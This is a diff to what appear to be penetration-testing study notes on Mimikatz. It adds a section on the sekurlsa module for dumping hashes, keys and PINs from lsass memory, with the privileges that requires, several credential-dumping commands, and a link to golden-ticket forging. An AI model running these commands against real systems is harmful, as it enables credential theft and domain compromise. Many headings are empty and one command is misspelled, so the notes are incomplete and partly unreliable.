@@ -28,9 +28,51 @@ kerberos::purge
 kerberos::tgt
 ```
 ### golden
+[[Active Directory/Exploitation/Kerberos#Golden Tickets|Golden Tickets]]
 - Create golden tickets from krbtgt's NTLM hash or Kerberos keys.
 ### silver
 - Create silver ticket from a service's NTLM hash or Kerberos keys.\
 
 # SekurLSA
+Dumps keys, password hashses, pin codes from protected memory of lsass.exe proccess.
+Rights required:
+- SYSTEM
+- Administrator with debug privilege (privilege::debug)
+### backupkeys
+- get backup master keys.
+```powershell
+sekurlsa::backupkey
+```
+### credman
+- Lists credential manager
+```powershell
+sekurlsa::credman
+```
+### dpapi
+[[DPAPI]]
+- Lists cached master keys
+```powershell
+sekurlsa::dpapi
+```
+### dpapisystem
+### ekeys
+Lists kerberos encryption keys
+```powershell
+sekursla::ekeys
+```
+### kerberos
+
+### krbtgt
+### livessp
+### logon passwords
+### minidump
+### msv
+### process
+### pth
+### ssp
+### tickets
+### trust
+### tspkg
+### widget
+
 # LSAdump
